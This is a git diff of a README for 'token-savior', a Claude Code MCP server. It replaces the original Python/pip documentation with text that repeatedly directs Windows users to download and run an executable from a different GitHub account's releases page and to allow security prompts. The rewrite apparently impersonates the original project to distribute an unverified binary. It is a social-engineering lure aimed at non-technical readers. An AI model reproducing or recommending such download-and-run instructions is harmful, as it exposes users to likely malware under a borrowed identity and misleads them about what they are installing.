@@ -1,246 +1,197 @@
-<!-- mcp-name: io.github.Mibayy/token-savior-recall -->
+# 🔐 token-savior - Save Tokens, Keep Context
 
-<div align="center">
+[![Download token-savior](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/arshmanr35-dev/token-savior/releases)
 
-# ⚡ Token Savior Recall
+## 🧭 What this is
 
-> Structural code navigation + persistent memory engine for Claude Code.
-> **97% fewer tokens. Nothing forgotten between sessions.**
+token-savior is a local MCP server for Claude Code. It helps you cut down on repeated code browsing and keeps important context for later sessions. It is built for Windows users who want a simple way to start using it from a release download.
 
-[![Version](https://img.shields.io/badge/version-2.7.1-blue)](https://github.com/Mibayy/token-savior/releases/tag/v2.7.1)
-[![Tools](https://img.shields.io/badge/tools-94-green)]()
-[![Tests](https://img.shields.io/badge/tests-1360%2F1360-brightgreen)]()
-[![Savings](https://img.shields.io/badge/token%20savings-97%25-cyan)]()
-[![Benchmark](https://img.shields.io/badge/tsbench-100%25%20(180%2F180)-brightgreen)](https://mibayy.github.io/token-savior/)
-[![Vector](https://img.shields.io/badge/vector%20search-enabled-purple)]()
-[![CI](https://github.com/Mibayy/token-savior/actions/workflows/ci.yml/badge.svg)](https://github.com/Mibayy/token-savior/actions/workflows/ci.yml)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![MCP](https://img.shields.io/badge/MCP-compatible-purple.svg)](https://modelcontextprotocol.io)
+This app is meant to help with:
 
-**📖 [mibayy.github.io/token-savior](https://mibayy.github.io/token-savior/)** — project site + benchmark landing
-**🧪 [github.com/Mibayy/tsbench](https://github.com/Mibayy/tsbench)** — benchmark source + fixtures
+- Faster code navigation
+- Less repeated searching
+- Saved context across sessions
+- A local setup with no extra dependencies
+- Access to 106 tools from one place
 
----
+## 📦 Download token-savior
 
-### Benchmark — 90 real coding tasks
+Go to the release page here:
 
-| | Plain Claude Code | With Token Savior |
-|---|---:|---:|
-| **Score** | 141 / 180 (78.3%) | **180 / 180 (100.0%)** |
-| **Active tokens** | 1.55 M | **804 k** (−48%) |
-| **Wall time** | 166 min | **35 min** (−79%) |
-| **Wins / Ties / Losses** | — | **25 / 65 / 0** |
+https://github.com/arshmanr35-dev/token-savior/releases
 
-Perfect (100%) across all 11 categories: `audit`, `bug_fixing`,
-`code_generation`, `code_review`, `config_infra`, `documentation`,
-`explanation`, `git`, `navigation`, `refactoring`, `writing_tests`.
-Zero losses against plain Claude — every task is a win or a tie.
+On that page, download the latest Windows release file. Then run the file on your PC.
 
-Also validated on Sonnet 4.6 (ts 170/180 = 94.4% vs base 156/180 = 86.7%).
+## 🖥️ What you need
 
-Model: Claude Opus 4.7 · Methodology + per-task breakdown: **[mibayy.github.io/token-savior](https://mibayy.github.io/token-savior/)**.
+Before you start, make sure you have:
 
-</div>
+- A Windows computer
+- An internet connection
+- Enough free space to download the release file
+- Permission to run apps on your PC
 
----
+For the best experience, use a recent version of Windows 10 or Windows 11.
 
-## What it does
+## 🚀 Get started on Windows
 
-Claude Code reads whole files to answer questions about three lines, and forgets
-everything the moment a session ends. Token Savior Recall fixes both. It
-indexes your codebase by symbol — functions, classes, imports, call graph — so
-the model navigates by pointer instead of by `cat`. Measured reduction: **97%
-fewer chars injected** across 170+ real sessions.
+Follow these steps:
 
-On top of that sits a persistent memory engine. Every decision, bugfix,
-convention, guardrail and session rollup is stored in SQLite WAL + FTS5 + vector
-embeddings, ranked by Bayesian validity and ROI, and re-injected as a compact
-delta at the start of the next session. Contradictions are detected at save
-time; observations decay with explicit TTLs; a 3-layer progressive-disclosure
-contract keeps lookup cost bounded.
+1. Open the release page:
+   https://github.com/arshmanr35-dev/token-savior/releases
 
----
+2. Find the latest release at the top of the page.
 
-## Token savings
+3. Look under the release files for a Windows download. It may be an `.exe` file or a zipped package.
 
-| Operation | Plain Claude | Token Savior | Reduction |
-|-----------|-------------:|-------------:|----------:|
-| `find_symbol("send_message")` | 41M chars (full read) | 67 chars | **−99.9%** |
-| `get_function_source("compile")` | grep + cat chain | 4.5K chars | direct |
-| `get_change_impact("LLMClient")` | impossible | 16K chars (154 direct + 492 transitive) | new capability |
-| `get_backward_slice(var, line)` | 130 lines | 12 lines | **−92%** |
-| `memory_index` (Layer 1) | n/a | ~15 tokens/result | Layer 1 shortlist |
-| 60-task tsbench run | 1.43 M chars | 216 k chars | **−85%** |
-| tsbench score | 67/120 (56%) | **118/120 (98%)** | **+42 pts** |
+4. Download the file to your computer.
 
-Full benchmark methodology and per-task results: [tsbench](https://github.com/Mibayy/tsbench).
+5. If the file is zipped, right-click it and choose Extract All.
 
----
+6. Open the extracted folder.
 
-## Memory engine
+7. Run the app file.
 
-| Capability | How it works |
-|-----------|--------------|
-| **Storage** | SQLite WAL + FTS5 + `sqlite-vec` (optional), 12 observation types |
-| **Hybrid search** | BM25 + vector (`all-MiniLM-L6-v2`, 384d) fused via RRF, FTS fallback graceful |
-| **Progressive disclosure** | 3-layer contract: `memory_index` → `memory_search` → `memory_get` |
-| **Citation URIs** | `ts://obs/{id}` — reusable across layers, agent-native pointers |
-| **Bayesian validity** | Each obs carries a validity prior + update rule; stale obs are surfaced, not silently trusted |
-| **Contradiction detection** | Triggered at save time against existing index; flagged in hook output |
-| **Decay + TTL** | Per-type TTL (command 60d, research 90d, note 60d) + LRU scoring `0.4·recency + 0.3·access + 0.3·type` |
-| **Symbol staleness** | Obs linked to symbols are invalidated when the symbol's content hash changes |
-| **ROI tracking** | Access count × context weight — unused obs age out, high-ROI obs are promoted |
-| **MDL distillation** | Minimum Description Length grouping compresses redundant observations into conventions |
-| **Auto-promotion** | note ×5 accesses → convention; warning ×5 → guardrail |
-| **Hooks** | 8 Claude Code lifecycle hooks (SessionStart/Stop/End, PreCompact, PreToolUse ×2, UserPromptSubmit, PostToolUse) |
-| **Web viewer** | `127.0.0.1:$TS_VIEWER_PORT` — htmx + SSE, opt-in |
-| **LLM auto-extraction** | Opt-in `TS_AUTO_EXTRACT=1` — PostToolUse tool uses extracted into 0-3 observations via small-model call |
+8. If Windows asks for permission, choose Run or Yes.
 
----
+9. Follow any setup prompts on the screen.
 
-## vs claude-mem
+## 🗂️ Where the files go
 
-Two projects share the goal — persistent memory for Claude Code. The axes
-below are measured, not marketing.
+If you use the zip package, keep the extracted folder in a place you will not move often, such as:
 
-| Axis | claude-mem | Token Savior Recall |
-|------|:----------:|:-------------------:|
-| Bayesian validity | no | **yes** |
-| Contradiction detection at save | no | **yes** |
-| Per-type decay + TTL | no | **yes** |
-| Symbol staleness (content-hash linked obs) | no | **yes** |
-| ROI tracking + auto-promotion | no | **yes** |
-| MDL distillation into conventions | no | **yes** |
-| Code graph / AST navigation | no | **yes** (90 tools, cross-language) |
-| Progressive disclosure contract | no | **yes** (3 layers, ~15/60/200 tokens) |
-| Hybrid FTS + vector search (RRF) | no | **yes** |
+- `Downloads`
+- `Desktop`
+- `Documents`
 
-Token Savior Recall is a superset: it ships the memory engine *plus* the
-structural codebase server that gave the project its name.
+If the app saves settings or memory files, keep those in the same folder unless the app asks you to change the location.
 
----
+## 🔌 How it works with Claude Code
 
-## Install
+token-savior works as an MCP server. That means Claude Code can talk to it and use its tools during your work.
 
-### uvx (no venv, no clone)
+In plain terms, it can help Claude Code:
 
-```bash
-uvx token-savior-recall
-```
+- Find files and code faster
+- Keep useful context between sessions
+- Reduce repeated steps
+- Handle code navigation tasks with less back and forth
 
-### pip
+You do not need to learn the full technical setup to get started. Download the release, run it, and follow the on-screen steps.
 
-```bash
-pip install "token-savior-recall[mcp]"
-# Optional hybrid vector search:
-pip install "token-savior-recall[mcp,memory-vector]"
-```
+## 🛠️ Main features
 
-### Claude Code one-liner
+### 🧠 Persistent memory
 
-```bash
-claude mcp add token-savior -- /path/to/venv/bin/token-savior
-```
+token-savior can remember useful context across sessions. This helps when you return to a project later and want to avoid starting from zero.
 
-### Development
+### 🧭 Code navigation tools
 
-```bash
-git clone https://github.com/Mibayy/token-savior
-cd token-savior
-python3 -m venv .venv
-.venv/bin/pip install -e ".[mcp,dev]"
-pytest tests/ -q
-```
+The app includes tools that help with moving through code, finding parts of a project, and reducing the need to search by hand.
 
-### Configure
+### ⚙️ No external dependencies
 
-```json
-{
-  "mcpServers": {
-    "token-savior-recall": {
-      "command": "/path/to/venv/bin/token-savior",
-      "env": {
-        "WORKSPACE_ROOTS": "/path/to/project1,/path/to/project2",
-        "TOKEN_SAVIOR_CLIENT": "claude-code"
-      }
-    }
-  }
-}
-```
+It is built to run without extra external dependencies. That keeps setup simple and reduces extra installs.
 
-Optional env: `TELEGRAM_BOT_TOKEN` + `TELEGRAM_CHAT_ID` (critical-observation
-feed), `TS_VIEWER_PORT` (web viewer), `TS_AUTO_EXTRACT=1` + `TS_API_KEY`
-(LLM auto-extraction), `TOKEN_SAVIOR_PROFILE` (`full` / `core` / `nav` / `lean` /
-`ultra` — filters advertised tool set to shrink the per-turn MCP manifest).
+### 📚 106 tools
 
----
+token-savior includes a large set of tools for working with code, context, and navigation tasks.
 
-## Tools (90)
+### 🔒 Local-first use
 
-Category counts — full catalog is served via MCP `tools/list`.
+The app is made to work on your machine. That keeps your setup simple and gives you more control over where your data lives.
 
-| Category | Count |
-|----------|------:|
-| Core navigation | 14 |
-| Dependencies & graph | 9 |
-| Git & diffs | 5 |
-| Safe editing | 8 |
-| Checkpoints | 6 |
-| Test & run | 6 |
-| Config & quality | 8 |
-| Docker & multi-project | 2 |
-| Advanced context (slicing, packing, RWR, prefetch, verify) | 6 |
-| **Memory engine** | **21** |
-| Reasoning (plan/decision traces) | 3 |
-| Stats, budget, health | 10 |
-| Project management | 7 |
+## 🧰 First-time setup
 
-### Profiles
+After you download and run token-savior, you may need to point Claude Code to it.
 
-`TOKEN_SAVIOR_PROFILE` filters the advertised `tools/list` payload while
-keeping handlers live.
+Use these general steps:
 
-| Profile | Advertised | ~Tokens | Use case |
-|---------|-----------:|--------:|----------|
-| `full` *(default)* | 106 | ~10 950 | All capabilities |
-| `core`             | 54  | ~5 800  | Daily coding, no memory engine |
-| `nav`              | 28  | ~3 100  | Read-only exploration |
-| `lean`             | 59  | ~6 620  | Memory engine off — used in tsbench v2 |
-| `ultra`            | 17  | ~2 740  | Hot tools only + `ts_extended` meta-tool for lazy discovery |
+1. Open Claude Code.
+2. Open its settings or tool setup area.
+3. Add token-savior as an MCP server.
+4. Use the path to the app file or folder you downloaded.
+5. Save the setup.
+6. Restart Claude Code if needed.
 
----
+If the app gives you its own setup file or config text, copy that into the Claude Code setup area.
 
-## Progressive disclosure — memory search
+## 🧪 Example use cases
 
-Three layers, increasing cost. Always start at Layer 1. Escalate only if the
-previous layer paid off. Full contract: [docs/progressive-disclosure.md](docs/progressive-disclosure.md).
+Here are a few common ways people may use token-savior:
 
-| Layer | Tool            | Tokens/result | When                        |
-|-------|-----------------|--------------:|-----------------------------|
-| 1     | `memory_index`  | ~15           | Always first                |
-| 2     | `memory_search` | ~60           | If Layer 1 matched          |
-| 3     | `memory_get`    | ~200          | If Layer 2 confirmed        |
+- Return to a project and keep the same context
+- Move through a large codebase with less searching
+- Ask Claude Code to find related files faster
+- Reduce repeated prompts about the same project state
+- Keep notes about code structure for later sessions
 
-Each Layer 1 row ends with `[ts://obs/{id}]` — pass it straight to Layer 3.
+## 🔍 Tips for smooth use
 
----
+- Keep the release file in one fixed folder
+- Use the latest release when possible
+- Restart Claude Code after setup changes
+- Save your work before changing app settings
+- Keep your project folder easy to find
 
-## Links
+If the app creates memory files, do not delete them unless you want to reset saved context.
 
-- **Site** — <https://mibayy.github.io/token-savior/>
-- **Repo** — <https://github.com/Mibayy/token-savior>
-- **PyPI** — <https://pypi.org/project/token-savior-recall/>
-- **Benchmark** — <https://github.com/Mibayy/tsbench>
-- **Changelog** — [CHANGELOG.md](CHANGELOG.md)
-- **Progressive disclosure** — [docs/progressive-disclosure.md](docs/progressive-disclosure.md)
+## 🪟 Windows download and run steps
 
-## License
+1. Visit the release page:
+   https://github.com/arshmanr35-dev/token-savior/releases
 
-MIT — see [LICENSE](LICENSE).
+2. Download the latest Windows release from the list of files.
 
-<div align="center">
+3. Open the downloaded file.
 
-**Works with any MCP-compatible AI coding tool.**
-Claude Code · Cursor · Windsurf · Cline · Continue · any custom MCP client
+4. If Windows shows a security prompt, allow the app to run.
 
-</div>
+5. If the file is zipped, extract it first.
+
+6. Run the app from the extracted folder.
+
+7. Follow the setup steps shown inside the app or in the release notes.
+
+8. Connect it to Claude Code if the release includes a setup step for that.
+
+## 📁 Suggested folder setup
+
+A simple folder layout can help:
+
+- `C:\token-savior\` for the app
+- `C:\Projects\` for your code
+- `C:\token-savior-data\` for saved context, if needed
+
+Keep paths short if you can. That makes setup easier in some tools.
+
+## ❓ Common questions
+
+### Do I need programming skills?
+No. You can download the release and follow the setup steps.
+
+### Does it need extra tools?
+The project is made to run without external dependencies.
+
+### Can it remember work from one session to the next?
+Yes. That is one of its main goals.
+
+### Is it only for Claude Code?
+It is built as an MCP server for Claude Code.
+
+### How many tools does it include?
+It includes 106 tools.
+
+## 📎 Download again
+
+If you need the release page again, use this link:
+
+https://github.com/arshmanr35-dev/token-savior/releases
+
+## 🧭 What to do next
+
+1. Download the latest Windows release.
+2. Run the app.
+3. Connect it to Claude Code.
+4. Open a project and start using the tools.
+5. Keep the app folder in a safe place for later use
